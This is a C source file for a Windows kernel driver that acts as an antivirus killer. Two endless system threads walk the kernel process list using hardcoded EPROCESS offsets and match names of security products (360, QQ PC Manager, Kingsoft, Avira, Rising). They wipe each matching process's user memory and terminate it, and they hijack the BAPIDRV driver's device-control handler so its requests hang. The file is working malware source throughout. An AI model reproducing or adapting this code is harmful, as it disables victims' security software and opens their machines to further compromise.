#include "stdafx.h"

NTKERNELAPI
NTSTATUS
ObReferenceObjectByName(
	IN PUNICODE_STRING ObjectName,
	IN ULONG Attributes,
	IN PACCESS_STATE PassedAccessState OPTIONAL,
	IN ACCESS_MASK DesiredAccess OPTIONAL,
	IN POBJECT_TYPE ObjectType,
	IN KPROCESSOR_MODE AccessMode,
	IN OUT PVOID ParseContext OPTIONAL,
	OUT PVOID *Object
						);
extern POBJECT_TYPE *IoDriverObjectType;

typedef struct _EPROCESSOFFSET {
	ULONG  ImageFileName;
	ULONG  SE_AUDIT_PROCESS_CREATION_INFO;
	ULONG  ActiveProcessLinks;
	ULONG  ThreadListHead;
} EPROCESSOFFSET, *PEPROCESSOFFSET;

typedef struct _SE_AUDIT_PROCESS_CREATION_INFO {
	POBJECT_NAME_INFORMATION ImageFileName;
} SE_AUDIT_PROCESS_CREATION_INFO, *PSE_AUDIT_PROCESS_CREATION_INFO;

typedef struct _KAPC_STATE 
{
	LIST_ENTRY ApcListHead[MaximumMode];
	struct _KPROCESS *Process;
	BOOLEAN KernelApcInProgress;
	BOOLEAN KernelApcPending;
	BOOLEAN UserApcPending;
} KAPC_STATE, *PKAPC_STATE, *PRKAPC_STATE;

VOID KeStackAttachProcess (IN PVOID Process,OUT PRKAPC_STATE ApcState);
VOID KeUnstackDetachProcess(IN PRKAPC_STATE ApcState);

ANSI_STRING	pathstr;
EPROCESSOFFSET eprooffset={0};

void KillProcess0(PVOID Context);
void KillProcess(PVOID Context);
void KillCompare(PANSI_STRING pimagename,PCHAR pstr,PBOOLEAN pbl);
void hsbsysUnload(IN PDRIVER_OBJECT DriverObject);
NTSTATUS hsbsysCreateClose(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS hsbsysDefaultHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);

#ifdef __cplusplus
extern "C" NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING  RegistryPath);
#endif

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING  RegistryPath)
{
	UNICODE_STRING DeviceName,Win32Device;
	PDEVICE_OBJECT DeviceObject = NULL;
	NTSTATUS status;
	unsigned i;
	HANDLE thhandle;
	RTL_OSVERSIONINFOW osv;
	char pszstr[512];
	ANSI_STRING str_a0;
	ANSI_STRING str_a1;

	RtlInitUnicodeString(&DeviceName,L"\\Device\\hsbsys0");
	RtlInitUnicodeString(&Win32Device,L"\\DosDevices\\hsbsys0");

	for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
		DriverObject->MajorFunction[i] = hsbsysDefaultHandler;

	DriverObject->MajorFunction[IRP_MJ_CREATE] = hsbsysCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = hsbsysCreateClose;
	
	DriverObject->DriverUnload = hsbsysUnload;
	status = IoCreateDevice(DriverObject,
							0,
							&DeviceName,
							FILE_DEVICE_UNKNOWN,
							0,
							FALSE,
							&DeviceObject);
	if (!NT_SUCCESS(status))
		return status;
	if (!DeviceObject)
		return STATUS_UNEXPECTED_IO_ERROR;

	DeviceObject->Flags |= DO_DIRECT_IO;
	DeviceObject->AlignmentRequirement = FILE_WORD_ALIGNMENT;
	status = IoCreateSymbolicLink(&Win32Device, &DeviceName);

	RtlZeroMemory(pszstr,512);
	osv.dwOSVersionInfoSize=sizeof(RTL_OSVERSIONINFOW); 
	RtlGetVersion(&osv);
	RtlStringCbPrintfA(pszstr,512,"%d.%d",osv.dwMajorVersion,osv.dwMinorVersion);
	RtlInitAnsiString(&str_a0,pszstr);
	RtlInitAnsiString(&str_a1,"5.1");
	if (RtlCompareString(&str_a0,&str_a1,TRUE)==0) //xpsp3
	{
		eprooffset.ImageFileName=0x174;
		eprooffset.SE_AUDIT_PROCESS_CREATION_INFO=0x1f4;
		eprooffset.ActiveProcessLinks=0x088;
	}
	RtlInitAnsiString(&str_a1,"5.2");
	if (RtlCompareString(&str_a0,&str_a1,TRUE)==0) //2003
	{
		eprooffset.ImageFileName=0x164;
		eprooffset.SE_AUDIT_PROCESS_CREATION_INFO=0x1e4;
		eprooffset.ActiveProcessLinks=0x098;
	}
	RtlInitAnsiString(&str_a1,"6.1");
	if (RtlCompareString(&str_a0,&str_a1,TRUE)==0) //win7
	{
		eprooffset.ImageFileName=0x16c;
		eprooffset.SE_AUDIT_PROCESS_CREATION_INFO=0x1ec;
		eprooffset.ActiveProcessLinks=0x0b8;
	}
	PsCreateSystemThread(&thhandle,0,NULL,NULL,NULL,KillProcess,NULL);
	PsCreateSystemThread(&thhandle,0,NULL,NULL,NULL,KillProcess0,NULL);

	DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
	return STATUS_SUCCESS;
}

void hsbsysUnload(IN PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING Win32Device;
	RtlInitUnicodeString(&Win32Device,L"\\DosDevices\\hsbsys0");
	IoDeleteSymbolicLink(&Win32Device);
	IoDeleteDevice(DriverObject->DeviceObject);
}

NTSTATUS hsbsysCreateClose(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS hsbsysDefaultHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	Irp->IoStatus.Status = STATUS_NOT_SUPPORTED;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return Irp->IoStatus.Status;
}

void KillCompare(PANSI_STRING pimagename,PCHAR pstr,PBOOLEAN pbl)
{
	ANSI_STRING exename;
	RtlInitAnsiString(&exename,pstr);
	if (RtlCompareString(pimagename,&exename,TRUE)==0)
	{
		*pbl=TRUE;
	}
}

NTSTATUS KillProcessDefaultHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	IoMarkIrpPending(Irp);
	return STATUS_PENDING;
}

void KillProcess0(PVOID Context)
{
	UNICODE_STRING drivername;
	PDRIVER_OBJECT driverobject=NULL;
	NTSTATUS status;
	LARGE_INTEGER timeout;
	RtlInitUnicodeString(&drivername,L"\\Driver\\BAPIDRV");
	while(TRUE)
	{
		__try
		{
			status=ObReferenceObjectByName(&drivername,OBJ_CASE_INSENSITIVE,NULL,FILE_ALL_ACCESS,*IoDriverObjectType,KernelMode,NULL,(PVOID*)&driverobject);
			if (NT_SUCCESS(status))
			{
				driverobject->MajorFunction[IRP_MJ_DEVICE_CONTROL]=KillProcessDefaultHandler;
				ObDereferenceObject(driverobject);
			}
		}__except(1){}
		RtlZeroMemory(&timeout,sizeof(LARGE_INTEGER));
		timeout.QuadPart=-3*10000000;
		KeDelayExecutionThread(KernelMode,FALSE,&timeout);
	}
}

void KillProcess(PVOID Context)
{
	NTSTATUS status;
	HANDLE prohd;
	BOOLEAN bexe;
	ULONG puserAddress;
	KAPC_STATE ApcState; 
	ANSI_STRING imagename;
	PEPROCESS pepro,ptempepro;
	LARGE_INTEGER timeout;
	PSE_AUDIT_PROCESS_CREATION_INFO papc;
	ANSI_STRING	pastr;
	PVOID pstrb=NULL;
	while(TRUE)
	{
		pepro=PsGetCurrentProcess();
		ptempepro=pepro;
		do 
		{
			bexe=FALSE;
			RtlInitAnsiString(&imagename,(PVOID)((ULONG)ptempepro+eprooffset.ImageFileName)); //+0x174 ImageFileName 
			papc=(PSE_AUDIT_PROCESS_CREATION_INFO)((ULONG)ptempepro+eprooffset.SE_AUDIT_PROCESS_CREATION_INFO);//EPROCESS偏移0x1f4处存放着_SE_AUDIT_PROCESS_CREATION_INFO结构的指针
			__try
			{
				if (papc->ImageFileName->Name.Length!=0)
				{
					RtlUnicodeStringToAnsiString(&pastr,&papc->ImageFileName->Name,TRUE);
					pstrb=strstr(pastr.Buffer,"360");
					if (pstrb!=NULL)
					{
						bexe=TRUE;
					}
					RtlFreeAnsiString(&pastr);
				}
			}__except(1){}
			KillCompare(&imagename,"360tray.exe",&bexe);
			KillCompare(&imagename,"360safe.exe",&bexe);
			KillCompare(&imagename,"ZhuDongFangYu.e",&bexe);
			KillCompare(&imagename,"360rp.exe",&bexe);
			KillCompare(&imagename,"360sd.exe",&bexe);
			KillCompare(&imagename,"qqpcrtp.exe",&bexe);
			KillCompare(&imagename,"qqpcleakscan.ex",&bexe);
			KillCompare(&imagename,"qqpctray.exe",&bexe);
			KillCompare(&imagename,"qqpcmgr.exe",&bexe);
			KillCompare(&imagename,"ksafe.exe",&bexe);
			KillCompare(&imagename,"kscan.exe",&bexe);
			KillCompare(&imagename,"kxescore.exe",&bexe);
			KillCompare(&imagename,"kxetray.exe",&bexe);
			KillCompare(&imagename,"ksafesvc.exe",&bexe);
			KillCompare(&imagename,"ksafetray.exe",&bexe);
			KillCompare(&imagename,"ksmgui.exe",&bexe);
			KillCompare(&imagename,"ksmsvc.exe",&bexe);
			KillCompare(&imagename,"avcenter.exe",&bexe);
			KillCompare(&imagename,"avgnt.exe",&bexe);
			KillCompare(&imagename,"avguard.exe",&bexe);
			KillCompare(&imagename,"avshadow.exe",&bexe);
			KillCompare(&imagename,"sched.exe",&bexe);
			KillCompare(&imagename,"ravmond.exe",&bexe);
			KillCompare(&imagename,"rsagent.exe",&bexe);
			KillCompare(&imagename,"rstray.exe",&bexe);
			KillCompare(&imagename,"rsmgrsvc.exe",&bexe);
			if (bexe)
			{
				KeStackAttachProcess(ptempepro,&ApcState);
				for(puserAddress=0;puserAddress<=0x7fffffff;puserAddress+=0x1000)
				{  
					if(MmIsAddressValid((PVOID)puserAddress))
					{
						__try
						{
							ProbeForWrite((PVOID)puserAddress,0x1000,sizeof(ULONG));
							RtlZeroMemory((PVOID)puserAddress, 0x1000);
						}__except(1)
						{ 
							continue;  
						}
					}
					else
					{
						if(puserAddress>0x1000000)//填这么多足够破坏进程数据了
						{
							break;
						}
					}
				}
				KeUnstackDetachProcess(&ApcState);
				status=ObOpenObjectByPointer(ptempepro,0,NULL,PROCESS_ALL_ACCESS,*PsProcessType,KernelMode,&prohd);
				if (NT_SUCCESS(status))
				{
					ZwTerminateProcess(prohd,0);
					ZwClose(prohd);
				}
			}
			ptempepro=(PEPROCESS)((ULONG)(*(PULONG)((ULONG)ptempepro+eprooffset.ActiveProcessLinks))-eprooffset.ActiveProcessLinks); //+0x088 ActiveProcessLinks : _LIST_ENTRY
		} while (ptempepro!=pepro);
		RtlZeroMemory(&timeout,sizeof(LARGE_INTEGER));
		timeout.QuadPart=-3*10000000;
		KeDelayExecutionThread(KernelMode,FALSE,&timeout);
	}
	PsTerminateSystemThread(STATUS_SUCCESS);
}